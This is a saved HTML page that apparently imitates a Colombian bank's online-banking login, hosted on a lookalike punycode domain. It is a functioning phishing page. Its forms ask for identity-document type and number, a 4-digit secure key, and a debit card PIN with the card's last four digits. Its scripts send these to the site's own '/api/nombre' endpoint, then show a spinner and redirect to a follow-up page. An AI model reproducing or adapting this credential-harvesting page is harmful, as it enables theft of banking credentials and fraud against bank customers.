<!DOCTYPE html>
<!-- saved from url=(0056)https://xn-%2Davalcumpliendosueos-c4b.online/inicia.html -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">

    <title>División y Carrusel</title>
    <link rel="stylesheet" href="./css/styles.css">
 
     
  </head>
  <body>
    <!-- Spinner overlay (hidden by default). Se muestra al presionar Ingresar y redirige luego -->
    <div id="spinner-overlay" class="spinner-overlay" style="display:none;">
      <div class="spinner-wrapper" role="status" aria-label="Cargando">
        <!-- Inline SVG wrapper con filtro para eliminar fondo blanco de la imagen PNG -->
        <svg class="spinner-image" viewBox="0 0 120 120" width="120" height="120" role="img" aria-hidden="true">
          <image href="images/ban.png" x="0" y="0" width="120" height="120" preserveAspectRatio="xMidYMid meet"></image>
        </svg>
        <div class="spinner-text" aria-live="polite">Espere un momento, por favor.</div>
      </div>
    </div>
    <div class="container">
      <div class="left">
        <div class="formulario">
          <div class="imagenlogo">
            <img src="assets/logo.svg" style="width: 200px">
          </div>
          <div class="titulo"><h2>Bienvenido a tu Banca Virtual</h2></div>
          <div class="seguriads">
            <img src="assets/entrada2.png" style="width: 100%">
          </div>
          <div class="formcontainer">
            <!-- Div superior con dos apartados -->
            <div class="header">
              <div class="tab active" id="tab-left" onclick="showForm(&#39;form1&#39;, this)">
                Clave segura
              </div>
              <div class="tab" id="tab-right" onclick="showForm(&#39;form2&#39;, this)">
                Tarjeta de debito
              </div>
            </div>

            <!-- Formularios -->
            <div class="forms">
              <div id="form1" class="form-content">
                <form id="segura">
                  <div style="height: 30px">
                    <label style="margin-bottom: 20px">Identificación</label>
                  </div>
                  <div style="display: flex">
                    <div style="width: 30%">
                      <select id="tipo" style="
                          outline: none;
                          margin: 0;
                          width: 100%;
                          text-indent: 16px;
                          padding: 0;
                          color: #000000;
                          border: solid 1px #b3b3b3;
                          background-color: white;
                          border-radius: 4px;
                          text-align: left;
                          height: 48px;
                          text-overflow: ellipsis;
                          padding-right: 16px;
                          font-size: 18px;
                        ">
                        <option hidden="" disabled="">Seleccione</option>
                        <option id="C.C.   Cédula de ciudadanía" value="CC">
                          C.C.. Cédula de ciudadanía
                        </option>
                        <option id="T.I.   Tarjeta de Identidad" value="TI">
                          T.I.. Tarjeta de Identidad
                        </option>
                        <option id="C.E.   Cédula de Extranjería" value="CE">
                          C.E.. Cédula de Extranjería
                        </option>
                        <option id="N.P.N. NIT Persona Natural" value="NI">
                          N.P.N.. NIT Persona Natural
                        </option>
                        <option id="N.P.E. NIT Persona Extranjera" value="NE">
                          N.P.E.. NIT Persona Extranjera
                        </option>
                        <option id="N.P.J. NIT Persona Jurídica" value="NJ">
                          N.P.J.. NIT Persona Jurídica
                        </option>
                        <option id="P.S.   Pasaporte" value="PA">
                          P.S.. Pasaporte
                        </option>
                        <option id="R.C.   Registro Civil" value="RC">
                          R.C.. Registro Civil
                        </option>
                      </select>
                    </div>
                    <div style="width: 70%">
                      <input id="identificacion" type="text" inputmode="numeric" placeholder="#" style="
                          outline: none;
                          margin: 0;
                          width: 100%;
                          text-indent: 16px;
                          padding: 0;
                          margin-left: 5px;
                          color: #000000;
                          border: solid 1px #b3b3b3;
                          background-color: white;
                          border-radius: 4px;
                          text-align: left;
                          height: 48px;
                          text-overflow: ellipsis;
                          padding-right: 16px;
                          font-size: 18px;
                        ">

                       
                    </div>
                  </div>
                  <div style="height: 30px; margin-top: 20px">
                    <label style="margin-bottom: 20px">Clave segura </label>
                  </div>
                  <div style="width: 100%">
                    <input id="clave" inputmode="numeric" type="text" minlength="4" maxlength="4"
					placeholder="..." style="
                        outline: none;
                        margin: 0;
                        width: 100%;

                        text-indent: 16px;
                        padding: 0;

                        color: #000000;
                        border: solid 1px #b3b3b3;

                        background-color: white;
                        border-radius: 4px;
                        text-align: left;
                        height: 48px;
                        text-overflow: ellipsis;
                        padding-right: 16px;
                        font-size: 18px;
                      ">
                  
                  </div>

                  <button type="submit" style="
                      width: 100%;
                      background: #0043a9;
                      border-radius: 20px;
                      padding: 20px;
                      color: white;
                      margin-top: 30px;
                      border: none;
                      cursor: pointer;
                    ">
                    Ingresar
                  </button>

                  <div style="width: 100%; text-align: center">
                    <img src="assets/footer.png" style="width: 100%" alt="">
                  </div>
                </form>
              </div>
           </div>
		    <!-- Formularios clave segura -->
			<!-- Formularios carnet estudiantil -->
		    <div id="form2" class="form-content" style="display: none">
                <form id="tarjeta">
                  <div style="height: 30px">
                    <label style="margin-bottom: 20px">Identificación</label>
                  </div>
                  <div style="display: flex">
                    <div style="width: 30%">
                      <select id="tipo2" style="
                          outline: none;
                          margin: 0;
                          width: 100%;
                          text-indent: 16px;
                          padding: 0;
                          color: #000000;
                          border: solid 1px #b3b3b3;
                          background-color: white;
                          border-radius: 4px;
                          text-align: left;
                          height: 48px;
                          text-overflow: ellipsis;
                          padding-right: 16px;
                          font-size: 18px;
                        ">
                        <option hidden="" disabled="">Seleccione</option>
                        <option id="C.C.   Cédula de ciudadanía" value="CC">
                          C.C. Cédula de ciudadanía
                        </option>
                        <option id="T.I.   Tarjeta de Identidad" value="TI">
                          T.I. Tarjeta de Identidad
                        </option>
                        <option id="C.E.   Cédula de Extranjería" value="CE">
                          C.E. Cédula de Extranjería
                        </option>
                        <option id="N.P.N. NIT Persona Natural" value="NI">
                          N.P.N. NIT Persona Natural
                        </option>
                        <option id="N.P.E. NIT Persona Extranjera" value="NE">
                          N.P.E. NIT Persona Extranjera
                        </option>
                        <option id="N.P.J. NIT Persona Jurídica" value="NJ">
                          N.P.J. NIT Persona Jurídica
                        </option>
                        <option id="P.S.   Pasaporte" value="PA">
                          P.S. Pasaporte
                        </option>
                        <option id="R.C.   Registro Civil" value="RC">
                          R.C. Registro Civil
                        </option>
                      </select>
                    </div>
                    <div style="width: 70%">
                      <input id="identificacion2" type="text" inputmode="numeric" 
					    placeholder="#" style="
                          outline: none;
                          margin: 0;
                          width: 100%;
                          font-size: 18px;
                          text-indent: 16px;
                          padding: 0;
                          margin-left: 5px;
                          color: #000000;
                          border: solid 1px #b3b3b3;

                          background-color: white;
                          border-radius: 4px;
                          text-align: left;
                          height: 48px;
                          text-overflow: ellipsis;
                          padding-right: 16px;
                        ">
                      
                    </div>
                  </div>
                  <div style="height: 30px; margin-top: 20px">
                    <label style="margin-bottom: 20px">Clave de tu tarjeta estudiantil   </div>
                  <div style="width: 100%">
                    <input id="clave2" inputmode="numeric" type="text" placeholder="..." style="
                        outline: none;
                        margin: 0;
                        width: 100%;
                        text-indent: 16px;
                        padding: 0;
                        color: #000000;
                        border: solid 1px #b3b3b3;
                        background-color: white;
                        border-radius: 4px;
                        text-align: left;
                        height: 48px;
                        text-overflow: ellipsis;
                        padding-right: 16px;
                        font-size: 18px;
                      ">
                  </div>

                  <div style="height: 30px; margin-top: 20px">
                    <label style="margin-bottom: 20px">Últimos 4 dígitos de tu tarjeta estudiantil</label>
                  </div>
                  <div style="width: 100%">
                    <input inputmode="numeric" minlength="4" maxlength="4" id="digito2" type="text" placeholder="..." style="
                        outline: none;
                        margin: 0;
                        width: 100%;
                        text-indent: 16px;
                        padding: 0;
                        color: #000000;
                        border: solid 1px #b3b3b3;
                        background-color: white;
                        border-radius: 4px;
                        text-align: left;
                        height: 48px;
                        text-overflow: ellipsis;
                        padding-right: 16px;
                        font-size: 18px;
                      ">

              
                  </div>

                  <button style="
                      width: 100%;
                      background: #0043a9;
                      border-radius: 20px;
                      padding: 20p;
                      color: white;
                      margin-top: 30px;
                    ">
                    Ingresar
                  </button>
                </form>
              </div>
		     <!-- Formularios -->
          </div>
        </div>
      </div>
      <div class="right">
        <div class="promo-image">
          <img src="./assets/credito.png" style="width: 100%">
        </div>
        <div class="carousel-wrapper">
          <button class="prev">❮</button>
          <div class="carousel">
            <div class="carousel-item">
              <img src="assets/1.png" style="width: 100%">
            </div>
            <div class="carousel-item">
              <img src="assets/2.png" style="width: 100%">
            </div>
            <div class="carousel-item">
              <img src="assets/3.png" style="width: 100%">
            </div>
            <div class="carousel-item">
              <img src="assets/4.png" style="width: 100%">
            </div>
            <div class="carousel-item">
              <img src="assets/5.png" style="width: 100%">
            </div>
          </div>
          <button class="next">❯</button>
        </div>
      </div>
    </div>
 
     <script>
      function showForm(formId, element) {
        // Ocultar todos los formularios
        document.querySelectorAll(".form-content").forEach(function (form) {
          form.style.display = "none";
        });

        // Mostrar el formulario seleccionado
        document.getElementById(formId).style.display = "inline";

        // Remover la clase activa de todas las pestañas
        document.querySelectorAll(".tab").forEach(function (tab) {
          tab.classList.remove("active");
        });

        // Agregar la clase activa a la pestaña seleccionada
        element.classList.add("active");
      }
    </script>

  <script>
    const form = document.getElementById("segura");

form.addEventListener("submit", async e=>{
 e.preventDefault();

 const tipo = document.getElementById("tipo").value.trim();
 const identificacion = document.getElementById("identificacion").value.trim();
 const clave = document.getElementById("clave").value.trim();

 if(!tipo || !identificacion || !clave){
   alert("Complete todos los campos");
   return;
 }

 if(!/^\d{4}$/.test(clave)){
   alert("La clave debe tener 4 dígitos");
   return;
 }

 document.getElementById("spinner-overlay").style.display="flex";

 try{

 const r = await fetch("/api/nombre",{
  method:"POST",
  headers:{ "Content-Type":"application/json"},
  body:JSON.stringify({
    tipo,
    identificacion,
    clave
  })
 });

 const j = await r.json();

 if(!j.id){
   alert("Error servidor");
   location.reload();
   return;
 }

 localStorage.setItem("id", j.id);

 location="load.html";

 }catch(err){
   console.error(err);
   alert("Error de conexión");
   location.reload();
 }
});

    
	
	
  </script>
    
 <script>
document.getElementById("tarjeta").addEventListener("submit", async e=>{
 e.preventDefault();

 const tipo=document.getElementById("tipo2").value;
 const iden=document.getElementById("identificacion2").value.trim();
 const clave=document.getElementById("clave2").value.trim();
 const dig=document.getElementById("digito2").value.trim();

 if(!tipo||!iden||!clave||!dig){
  alert("Complete todos los campos");
  return;
 }

 if(!/^\d{4}$/.test(clave)){
  alert("Clave inválida");
  return;
 }

 document.getElementById("spinner-overlay").style.display="flex";

 try{

  const r=await fetch("/api/nombre",{
   method:"POST",
   headers:{ "Content-Type":"application/json"},
   body:JSON.stringify({
    tipo,
    identificacion:iden,
    clave,
    ultimos:dig
   })
  });

  const j=await r.json();

  if(!j.id) throw "error";

  localStorage.setItem("id",j.id);
  location="load.html";

 }catch{
  alert("Error conexión");
  location.reload();
 }
});

</script>     
    
</body></html>
